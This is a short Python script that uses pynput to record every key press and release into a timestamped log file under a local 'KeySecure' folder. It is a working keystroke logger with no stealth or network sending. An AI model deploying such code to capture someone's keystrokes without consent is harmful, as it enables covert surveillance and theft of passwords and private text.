from pynput import keyboard
from datetime import datetime
todays_date = datetime.now().strftime('%Y-%b-%d-%H%M%S')

def get_key_name(key): #gets keyboard input
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)
 
def on_press(key):	#writes to file pressed buttons
    key_name = get_key_name(key)
    with open('C:\\KeySecure\\logs\\Log-' + todays_date + '.txt', 'a+') as f:
        print('Key {} pressed.'.format(key_name), file=f)
 
def on_release(key):	#writes to file released buttons
    key_name = get_key_name(key)
    with open('C:\\KeySecure\\logs\\Log-' + todays_date + '.txt', 'a+') as f:
        print('Key {} released.'.format(key_name), file=f)

with keyboard.Listener(	#defines functions
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()
